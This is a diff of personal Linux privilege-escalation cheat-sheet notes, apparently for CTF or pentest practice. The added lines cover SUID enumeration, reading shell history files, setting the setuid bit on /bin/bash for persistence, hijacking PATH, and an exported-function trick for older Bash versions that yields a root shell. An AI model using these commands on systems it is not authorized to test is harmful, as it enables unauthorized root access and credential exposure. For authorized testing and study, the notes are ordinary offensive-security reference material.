@@ -5,10 +5,11 @@
 2. Always check /etc/crontab
 3. Always check capabilities >>> getcap -r / 2>/dev/null
 4. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
-5. find / -user root -perm -4000 -print 2>/dev/null
-6. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root
-7. linpeas linenum pspy name ur shits
-
+5. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+6. find / -user root -perm -4000 -print 2>/dev/null
+7. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
+8. linpeas linenum pspy name ur shits
+9. Always check `cat ~/.*history | less` or just `history`
 
 
 **PATH Privesc**
@@ -20,6 +21,13 @@ cat >>> can
 3. chmod +x [the misconfigured]
 4. export PATH=/tmp:$PATH
 5. Execute the misconfigured binary
+
+# In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+/usr/bin/cat >>> can
+1. function /usr/sbin/service { /bin/bash -p; }
+2. export -f /usr/sbin/service
+3. Execute the misconfigured binary
+
 
 ### Does not have to be in /tmp, u can create your own folder
 
